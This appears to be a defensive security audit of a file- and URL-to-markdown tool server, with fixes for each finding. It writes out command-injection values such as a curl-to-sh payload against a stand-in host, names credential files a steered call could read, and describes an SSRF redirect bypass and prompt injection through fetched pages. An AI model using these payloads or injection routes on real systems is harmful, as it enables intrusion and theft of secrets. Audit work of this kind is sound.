title: filepath, uvPath and projectRoot from tool arguments are pasted into a shell command
reason: Any *-to-markdown tool call puts filepath (only wrapped in double quotes, so $(...) and backticks still expand) and the undocumented uvPath argument straight into child_process.exec; filepath='$(curl evil.sh|sh)' or uvPath='sh -c id #' runs arbitrary commands. The url tools pass uvPath/projectRoot too.
fix: Drop uvPath and projectRoot from the request schema (take them only from operator config/env), and call execFile(uvPath, ['run', markitdownPath, '--', filePath]) with no shell.

title: get-markdown-file and the file converters read any file on the host
reason: filepath is any absolute path with no root or extension check, so a steered call to get-markdown-file with ~/.ssh/id_rsa or ~/.aws/credentials returns the secret to the model; the converter tools likewise read any path.
fix: Resolve with fs.realpathSync and require the result to be inside an operator-configured allowed directory (path.relative not starting with '..'); for get-markdown-file only allow files this server wrote (os.tmpdir()/markdown_output_*.md).

title: Private-IP check only looks at the literal hostname; DNS names and redirects bypass it
reason: is_ip_private checks the hostname string without resolving it, and fetch follows redirects, so a URL whose DNS name resolves to 127.0.0.1/169.254.169.254, or a public URL that 302-redirects there, reaches internal services and returns the body to the model.
fix: Resolve the hostname (dns.lookup all addresses) and reject private/loopback/link-local/IPv6-local results, fetch with redirect: 'manual' and re-check each hop, and pin the connection to the checked IP.

title: Fetched web pages / documents are returned to the model unmarked
reason: Converted web pages, YouTube transcripts and documents go straight into the model context as plain text, so instructions hidden in them can steer the next tool call (e.g. into M001/M002).
fix: Wrap returned content in clearly delimited untrusted-data markers and tell the client it is data, not instructions; fix M001/M002 so steered calls cannot do harm.

title: npm preinstall pipes a remote script into sh
reason: Installing the package runs an unpinned remote installer script with the installer's privileges; if that URL or the network is compromised, install-time code runs.
fix: Remove the preinstall hook; document installing uv separately or pin a versioned installer with a checksum.
